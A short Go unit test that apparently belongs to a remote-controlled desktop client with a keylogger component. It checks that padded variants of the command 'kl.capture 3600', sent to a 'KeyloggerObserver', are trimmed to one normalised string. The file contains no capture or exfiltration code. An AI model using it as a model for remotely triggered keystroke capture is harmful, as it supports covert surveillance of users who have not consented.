package observer

import (
	"marauders-map-client-desktop/internal/wsclient/observer"
	"testing"
)

func TestObserverNotified(t *testing.T) {

	o := observer.NewKeyloggerObserver()

	subject := observer.Subject{Observers: make([]observer.ObserverInterface, 0)}
	subject.AddListener(o)

	// Many messages format to trim
	commands := []string{
		"kl.capture 3600",
		"kl.capture     3600",
		"      kl.capture     3600    ",
		"kl.capture     3600     ",
		"    kl.capture     3600",
	}

	for _, c := range commands {
		// Notify to the observer
		subject.Notify(c)

		// Check if Msg notified is equal
		if "kl.capture 3600" != o.Msg {
			t.Fail()
		}
	}
}
